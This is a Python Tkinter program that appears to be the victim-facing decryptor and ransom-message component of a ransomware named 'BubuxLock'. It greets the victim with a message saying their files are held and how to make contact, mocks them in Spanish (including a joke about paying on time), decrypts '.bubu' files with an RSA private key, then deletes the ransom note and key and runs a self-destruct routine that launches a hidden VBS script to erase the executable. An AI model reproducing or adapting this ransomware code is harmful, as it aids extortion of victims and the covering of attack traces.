import tkinter as tk
from tkinter import filedialog, messagebox
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP
import os
import random
import time
import sys
import tempfile

def self_destruct():
    exe_path = sys.executable

    if exe_path.endswith(".exe"):
        bat_path = os.path.join(tempfile.gettempdir(), "autodelete.bat")
        vbs_path = bat_path.replace(".bat", ".vbs")
        
        with open(bat_path, "w") as bat:
            bat.write(f"""
        @echo off
        timeout /t 2 > nul
        del "{exe_path}"
        del "%~f0"
        """)
        with open(vbs_path, "w") as vbs:
            vbs.write(f'''
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run chr(34) & "{bat_path}" & chr(34), 0
        Set WshShell = Nothing
        ''')
            
        os.startfile(vbs_path)

def decrypt(private_key):
    frases_ok = [
        "Este archivo sí que estaba bien escondido, ¿eh?",
        "Otro más pa' la lista, crack.",
        "¿Quién te manda a abrir archivos sospechosos?",
        "Desencriptado... pero no olvides esta lección, campeón.",
        "Tranquilo, ya casi recuperas tus memes.",
        "¡Uy! Este casi se queda cifrado para siempre.",
        "Si fueras un poco más cuidadoso, no estaríamos aquí.",
        "Otro archivo salvado por el gran Bob.",
        "No llores, ya casi terminamos.",
        "La próxima vez... paga a tiempo jeje."
    ]

    frases_error = [
        "Oops... ¿Seguro que esta era la llave correcta?",
        "Ni la magia de Bob pudo con este archivo.",
        "Este se va a quedar cifrado por los siglos...",
        "¿Y si pruebas con otra llave, campeón?",
        "No es por nada, pero este archivo no coopera.",
        "Creo que este se perdió para siempre... ups.",
        "A este archivo no le cayó bien tu llave.",
        "¿Intentaste prender y apagar la PC? No, no sirve.",
        "Este se resistió... fuerte el condenado.",
        "Parece que tu 'private.pem' es de juguete jeje."
    ]

    files = []
    cipher = PKCS1_OAEP.new(private_key)

    for file in os.listdir():
        if not file.endswith('.bubu'):
            continue
        if os.path.isfile(file):
            files.append(file)

    for file in files:
        with open(file, 'rb') as f:
            data = f.read()

        try:
            data_decrypted = cipher.decrypt(data)

            output_path = file[:-5]
            with open(output_path, 'wb') as f_out:
                f_out.write(data_decrypted)

            time.sleep(0.2)
            os.remove(file)

            frase = random.choice(frases_ok)
            log_output.insert(tk.END, f"✓ {file} desencriptado. {frase}\n")
        except ValueError:
            frase_err = random.choice(frases_error)
            log_output.insert(tk.END, f"✗ {file} no pudo desencriptarse. {frase_err}\n", "error")
        except Exception as e:
            log_output.insert(tk.END, f"⚠ {file} desencriptado pero no se pudo borrar: {e}\n", "error")

        log_output.see(tk.END)

def ask_user():
    response = messagebox.askquestion(
        "Confirmación",
        "Hola amigo! ¿Colocaste la llave que te proporcioné en un archivo llamado private.pem? ¿O te dije que lo había creado?"
    )
    return response == 'yes'

def handle_file_upload():
    file_path = filedialog.askopenfilename(title="Selecciona el archivo private.pem", filetypes=[("PEM files", "*.pem")])
    if not file_path:
        return

    if ask_user():
        if os.path.basename(file_path) != "private.pem":
            messagebox.showwarning("Nombre incorrecto", "¡Mentirosillo! No encontré el archivo llamado exactamente 'private.pem'.")
            return

        try:
            with open(file_path, 'r') as f:
                key_data = f.read()
                private_key = RSA.import_key(key_data)

            messagebox.showinfo("Desencriptando...", "Perfecto! Ahora procederé a desencriptar tus archivos.")
            decrypt(private_key)

            messagebox.showinfo("Éxito", "¡Archivos desencriptados!\nToma esto como un aprendizaje, no caigas otra vez en la trampa amigo.")
        
            log_output.insert(tk.END, "Destruyendo el programa...\n")
            os.remove("README.txt")
            log_output.insert(tk.END, "README.txt eliminado.\n")
            time.sleep(1)
            os.remove('private.pem')
            log_output.insert(tk.END, "private.pem eliminado.\n")
            time.sleep(1)
            log_output.insert(tk.END, "Hasta pronto... Recuerda la lección\n")
            time.sleep(3)
        
            self_destruct()
            root.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"No se pudo importar la llave: {str(e)}")
    else:
        messagebox.showinfo("Instrucciones", "¿Acaso no quieres tus archivos de vuelta? Coloca la llave en un archivo llamado private.pem.")

def show_intro_message():
    msg = (
        "Hola amigo!\n\n"
        "Ahora mismo, tal vez andas preocupado o asustado (es normal), "
        "pero tranquilo, tus archivos están a salvo conmigo (y solo conmigo).\n\n"
        "Si quieres recuperarlos, crea un archivo en tu escritorio llamado 'pls.txt' "
        "y nos pondremos en contacto.\n\n"
        "En caso de no responderte dentro de 24h, puedes asumir que tus archivos están perdidos para siempre... "
        "Lo siento.\n\n"
        "Es broma jeje.\n\n"
        "Si no te respondo dentro de 24h, envíame un mail a: \n"
        "pernille.rask662@dontsp.am\n\n"
        "Con el asunto: 'Ayuda amigo!!' y te respondo de inmediato."
    )
    messagebox.showinfo("Mensaje de Bob", msg)

# GUI setup
root = tk.Tk()
root.title("Desencriptador de Archivos - BubuxLock")
root.geometry("640x400")
root.configure(bg="black")

# Centrar ventana
root.update_idletasks()
w = root.winfo_width()
h = root.winfo_height()
x = (root.winfo_screenwidth() // 2) - (w // 2)
y = (root.winfo_screenheight() // 2) - (h // 2)
root.geometry(f'{w}x{h}+{x}+{y}')

# Mostrar mensaje inicial
root.after(100, show_intro_message)

# Título
title = tk.Label(root, text="BubuxLock Decryptor", fg="red", bg="black", font=("Arial", 28, "bold"))
title.pack(pady=20)

# Instrucción
desc = tk.Label(root, text="Sube el archivo llamado 'private.pem' para continuar.", fg="white", bg="black", font=("Arial", 14))
desc.pack(pady=5)

# Botón de carga
upload_btn = tk.Button(root, text="Seleccionar archivo PEM", command=handle_file_upload, font=("Arial", 14), bg="green", fg="white")
upload_btn.pack(pady=10)

# Log visual
log_output = tk.Text(root, height=8, bg="black", fg="lime", font=("Courier", 10))
log_output.tag_config("error", foreground="orange red")
log_output.pack(padx=20, pady=10, fill="both")

# Botón de salida
exit_btn = tk.Button(root, text="Salir", command=root.destroy, font=("Arial", 12), bg="darkred", fg="white")
exit_btn.pack(pady=(5, 10))

root.mainloop()
